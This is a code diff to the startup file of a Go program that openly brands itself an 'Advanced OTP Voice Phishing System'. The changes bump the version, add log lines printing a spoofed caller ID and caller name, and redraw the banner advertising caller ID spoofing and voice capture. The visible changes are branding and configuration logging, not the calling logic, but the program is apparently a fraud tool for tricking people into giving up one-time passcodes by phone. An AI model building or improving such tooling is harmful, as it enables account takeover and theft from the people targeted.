@@ -13,10 +13,8 @@ import (
 )
 
 var (
-	version = "1.0.0"
+	version = "1.1.0"
 )
-
-
 
 func main() {
 	
@@ -62,11 +60,13 @@ func main() {
 	}
 
 	
-	log.Printf("✅ OTP Bot Master v%s is running!", version)
+	log.Printf("🍕 Pizza OTP Bot v%s is running!", version)
 	log.Printf("📱 Bot token: %s...", maskString(cfg.BotToken, 10))
 	log.Printf("📞 Plivo number: %s", cfg.PlivoNumber)
 	log.Printf("🗄️  Database: %s", cfg.DatabasePath)
 	log.Printf("⚡ Concurrency: %d", cfg.Concurrency)
+	log.Printf("🎭 Spoof CallerID: %s", cfg.CallerID)
+	log.Printf("🎭 Spoof CallerName: %s", cfg.CallerName)
 
 	
 	waitForShutdown(otpBot)
@@ -75,19 +75,28 @@ func main() {
 
 func printBanner() {
 	banner := `
-╔═══════════════════════════════════════════════════════╗
-║                                                       ║
-║      ██████╗ ██████╗ ██████╗ ██████╗               ║
-║      ██╔══██╗██╔══██╗██╔══██╗██╔══██╗              ║
-║      ██████╔╝██████╔╝██████╔╝██║  ██║              ║
-║      ██╔══██╗██║  ██║██║  ██║██║  ██║              ║
-║      ██████╔╝██║  ██║██║  ██║██████╔╝              ║
-║      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝               ║
-║                                                       ║
-║   🍕 Pizza OTP Bot v%s                               ║
-║   🎭 Voice OTP Spoofing System                        ║
-║                                                       ║
-╚═══════════════════════════════════════════════════════╝
+
+    ╔═══════════════════════════════════════════════════════╗
+    ║                                                       ║
+    ║   ██████╗ ██████╗ ██████╗ ██████╗  ╔══╗              ║
+    ║   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗ ║  ║              ║
+    ║   ██████╔╝██████╔╝██████╔╝██║  ██║ ║  ║              ║
+    ║   ██╔══██╗██║  ██║██║  ██║██║  ██╗ ║  ║              ║
+    ║   ██████╔╝██║  ██║██║  ██║██████╔╝ ║  ║              ║
+    ║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚══╝              ║
+    ║                                                       ║
+    ║   ██████╗  █████╗ ██████╗ ██████╗                     ║
+    ║   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗                    ║
+    ║   ██████╔╝███████║██████╔╝██████╔╝                    ║
+    ║   ██╔══██╗██╔══██║██╔══██╗██╔══██╗                    ║
+    ║   ██████╔╝██║  ██║██║  ██║██║  ██║                    ║
+    ║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                    ║
+    ║                                                       ║
+    ║   🔮 Advanced OTP Voice Phishing System v%s            ║
+    ║   🎭 Caller ID Spoofing • 📞 Voice Capture            ║
+    ║                                                       ║
+    ╚═══════════════════════════════════════════════════════╝
+
 `
 	fmt.Printf(banner, version)
 }
